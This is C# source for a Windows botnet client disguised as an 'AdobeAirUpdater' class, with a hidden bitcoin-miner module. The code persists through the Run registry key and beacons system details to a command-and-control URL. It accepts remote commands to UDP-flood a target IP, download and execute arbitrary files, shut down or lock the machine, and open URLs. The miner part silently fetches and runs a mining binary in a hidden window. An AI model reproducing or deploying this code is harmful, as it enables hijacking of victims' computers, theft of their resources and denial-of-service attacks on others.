﻿using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Management;
using System.Threading;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace botn
{
    
    static class AdobeAirUpdater
    {
        static void Main()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("Torrent", Application.ExecutablePath.ToString());
            
            Run();
            while (run) {
                Thread.Sleep(1000);
            }

        }
        
        private static string defaultstring = "http://exonapps.nl/v2/listener.php";

        private static string editedstring = "[^INDEX^]^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^";

        public static string editedString
        {
            get
            {
                string temp = editedstring.Replace("^", "");
                return temp != "[INDEX]" ? temp : defaultstring;
            }
        }

        private static string getUNIQE
        {
            get
            {
                string uniqe = "";
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    uniqe = nic.GetPhysicalAddress().ToString();
                    break;

                }
                using (MD5 md5Hash = MD5.Create())
                {
                    byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(uniqe));
                    StringBuilder sBuilder = new StringBuilder();
                    for (int i = 0; i < data.Length; i++)
                    {
                        sBuilder.Append(data[i].ToString("x2"));
                    }
                    uniqe = sBuilder.ToString();
                }

                return uniqe;
            }
        }

        private static void Run()
        {
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                while (run)
                {
                    if (free)
                    {
                        try
                        {
                            free = false;
                            StringBuilder s = new StringBuilder();
                            ManagementObjectSearcher mos =
                            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                            foreach (ManagementObject mo in mos.Get())
                            {

                                s.Append((s.ToString().Length > 0 ? "_" : "") + mo["Name"]);
                            }

                            StringBuilder a = new StringBuilder();
                            ManagementObjectSearcher mosa =
                            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                            foreach (ManagementObject moa in mosa.Get())
                            {

                                a.Append((a.ToString().Length > 0 ? "_" : "") + moa["Name"]);
                            }
                            string operatingSystem = "";
                            System.OperatingSystem os = Environment.OSVersion;
                            Version vs = os.Version;
                            if (os.Platform == PlatformID.Win32Windows)
                            {
                                switch (vs.Minor)
                                {
                                    case 0:
                                        operatingSystem = "Windows 95";
                                        break;
                                    case 10:
                                        if (vs.Revision.ToString() == "2222A")
                                            operatingSystem = "Windows 98SE";
                                        else
                                            operatingSystem = "Windows 98";
                                        break;
                                    case 90:
                                        operatingSystem = "Windows Me";
                                        break;
                                    default:
                                        break;
                                }
                            }
                            else if (os.Platform == PlatformID.Win32NT)
                            {
                                switch (vs.Major)
                                {
                                    case 3:
                                        operatingSystem = "Windows NT 3.51";
                                        break;
                                    case 4:
                                        operatingSystem = "Windows NT 4.0";
                                        break;
                                    case 5:
                                        if (vs.Minor == 0)
                                            operatingSystem = "Windows 2000";
                                        else
                                            operatingSystem = "Windows XP";
                                        break;
                                    case 6:
                                        if (vs.Minor == 0)
                                            operatingSystem = "Windows Vista";
                                        else if (vs.Minor == 1)
                                            operatingSystem = "Windows 7";
                                        else if (vs.Minor == 2)
                                            operatingSystem = "Windows 8";
                                        break;
                                    default:
                                        break;
                                }
                            }
                            else
                            {
                                operatingSystem = os.Platform.ToString();
                                if (os.Platform == PlatformID.Win32S)
                                    operatingSystem = "PlatformID.Win32S";

                                if (os.Platform == PlatformID.Win32NT)
                                    operatingSystem = "PlatformID.Win32NT";

                                if (os.Platform == PlatformID.Unix)
                                    operatingSystem = "PlatformID.Unix";

                                if (os.Platform == PlatformID.MacOSX)
                                    operatingSystem = "PlatformID.MacOSX";

                                if (os.Platform == PlatformID.Win32Windows)
                                    operatingSystem = "PlatformID.Win32Windows";

                                if (os.Platform == PlatformID.WinCE)
                                    operatingSystem = "PlatformID.WinCE";

                                if (os.Platform == PlatformID.Xbox)
                                    operatingSystem = "PlatformID.Xbox";

                            }



                            string gpu = a.ToString();
                            string pcnaam = System.Environment.MachineName;
                            string cpu = s.ToString();
                            WebClient client = new WebClient();
                            client.Proxy = null;

                            String htmlCode = "";
                            try
                            {
                                if (run)
                                    htmlCode = client.DownloadString(editedString + "?pcnaam=" + pcnaam + "&uni=" + getUNIQE + "&winos=" + operatingSystem + "&cpu=" + cpu + "&gpu=" + gpu);
                            }
                            catch { }
                            htmlCode = htmlCode.Replace("<br>", "\r\n");

                            bool remove = htmlCode.ToLower().Contains("remove");
                            bool shutdown = htmlCode.ToLower().Contains("shutdown");
                            bool lockpc = htmlCode.ToLower().Contains("lock");
                            bool message = htmlCode.ToLower().Contains("message");
                            bool ddos = htmlCode.ToLower().Contains("ddos");
                            bool browse = htmlCode.ToLower().Contains("browse");
                            bool download = htmlCode.ToLower().Contains("download");
                            

                            if (ddos)
                            {
                                // Ddos

                                //122700.044|80|20|
                                htmlCode = htmlCode.Replace("ddos ", "");
                                string[] split = htmlCode.Split('|');
                                //int count = 0;

                                string ip = split[0];
                                int port = int.Parse(split[1]);
                                int time = int.Parse(split[2])*1000; 
                                /*
                                foreach (string sp in split)
                                {
                                    if (count == 0)
                                    {
                                        ip = sp;
                                       
                                    }
                                    else if (count == 1)
                                    {
                                        port = int.Parse(sp);
                                    }
                                    else if (count == 2)
                                    {
                                        time = int.Parse(sp) * 1000;
                                        count = 0;
                                        break;
                                    }

                                    count++;
                                }
                                */
                                
                                    byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes("SAJSJKQJL1337KSJQLKJQKLJQSKJQSKJQSBJDBJIKDQIQSIJQSJI");

                                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);

                                    Socket clientddos = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                                    clientddos.SendTimeout = 1;
                                    for (int i = 0; i < Convert.ToInt32(time); i++)
                                    {
                                        clientddos.SendTo(packetData, ep);
                                    }

                            }

                            if (download)
                            {
                                new System.Threading.Thread(() =>
                                {
                                    try
                                    {
                                        string ext = htmlCode.ToLower();
                                        ext = ext.Split('.')[ext.Split('.').Length - 1];

                                        client.DownloadFile(htmlCode.ToLower().Replace("download ", ""), @"C:\Documents and Settings\" + Environment.UserName + @"\AppData\defile." + ext.Replace("\n", "").Replace("\r", ""));
                                        Process.Start(@"C:\Documents and Settings\" + Environment.UserName + @"\AppData\defile." + ext.Replace("\n", "").Replace("\r", ""));
                                    }
                                    catch
                                    { }
                                }).Start();

                            }


                            if (remove)
                            {
                                new System.Threading.Thread(() =>
                                {
                                    run = false;
                                    //MessageBox.Show("afsluiten");

                                }).Start();
                            }
                            if (shutdown)
                            {
                                new System.Threading.Thread(() =>
                                {
                                    System.Threading.Thread.CurrentThread.IsBackground = true;
                                    Process.Start("shutdown", "/s /t 0");
                                }).Start();
                            }
                            if (lockpc)
                            {
                                new System.Threading.Thread(() =>
                                {
                                    System.Threading.Thread.CurrentThread.IsBackground = true;
                                    Process.Start(@"C:\WINDOWS\system32\rundll32.exe", "user32.dll,LockWorkStation");
                                }).Start();
                            }
                            if (message)
                            {

                                new System.Threading.Thread(() =>
                                {
                                    System.Threading.Thread.CurrentThread.IsBackground = true;

                                    Form f = new Form();
                                    f.Show();
                                    f.Hide();
                                    f.TopMost = false;
                                    f.TopMost = true;
                                    MessageBox.Show(f, htmlCode.Replace("message ", ""), "Message");
                                    f.Close();
                                }).Start();
                            }

                            if (browse)
                            {
                                new System.Threading.Thread(() =>
                                {
                                    System.Threading.Thread.CurrentThread.IsBackground = true;
                                    System.Diagnostics.Process.Start(htmlCode.ToLower().Replace("browse ", ""));
                                }).Start();
                            }
                            free = true;
                        }
                        catch (System.Net.WebException)
                        {

                        }
                    }

                    Thread.Sleep(500);
                }
            }).Start();
        }



        private static Boolean run = true;
        private static Boolean free = true;

    }
}
static class bitcoinminer
    {
        public static string pool, user, pass, minerURL;
        public static string intensity = "-10";
        private static System.Diagnostics.Process proc;

        public static void start()
        {

            _handler += new EventHandler(Handler);
            SetConsoleCtrlHandler(_handler, true);

            new System.Threading.Thread(()=>{

                string Tpath = Environment.GetEnvironmentVariable("temp");
                string path = Tpath + @"\cgm\";
                string exName = "cgm.exe";
                string extractF = path + "xTract.exe";
                string fURZL = minerURL;
                try
                {
                    if (!System.IO.Directory.Exists(path))
                        System.IO.Directory.CreateDirectory(path);
                }
                catch { return; }

                if (!System.IO.File.Exists(path + exName))
                {
                    try
                    {
                        if (!System.IO.File.Exists(extractF))
                        {
                        System.Net.WebClient w = new System.Net.WebClient();
                        w.Proxy = null;
                        byte[] b = w.DownloadData(fURZL);
                        System.IO.File.WriteAllBytes(extractF, b);
                        }
                    }
                    catch { }
                    runNotShelled(extractF);
                    System.Threading.Thread.Sleep(1000);
                }

                bool d = runShelledWargs(path + exName, "--intensity " + intensity + " -o " + pool + " -u " + user + " -p " + pass);
                if (d) return;
                while (!proc.HasExited)
                {
                    System.Threading.Thread.Sleep(100);
                }

            }).Start();
        }

        private static Boolean runNotShelled(string Fle)
        {
            try
            {
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = Fle;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                System.Diagnostics.Process.Start(psi);
            }
            catch { return true; }
            return false;
        }

        private static Boolean runShelledWargs(string exNam, string args)
        {
            try
            {
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = exNam;
                psi.Arguments = args;
                psi.UseShellExecute = true;
                psi.CreateNoWindow = true;
                psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                proc = System.Diagnostics.Process.Start(psi);
            }
            catch { return true; }
            return false;
        }

        [System.Runtime.InteropServices.DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);

        private delegate bool EventHandler(CtrlType sig);
        static EventHandler _handler;

        enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        private static bool Handler(CtrlType sig)
        {
            switch (sig)
            {
                case CtrlType.CTRL_C_EVENT:
                case CtrlType.CTRL_LOGOFF_EVENT:
                case CtrlType.CTRL_SHUTDOWN_EVENT:
                case CtrlType.CTRL_CLOSE_EVENT:
                    bitcoinminer.proc.Kill();
                    return false;
                default:
                    return true;
            }
        }

    }


            

           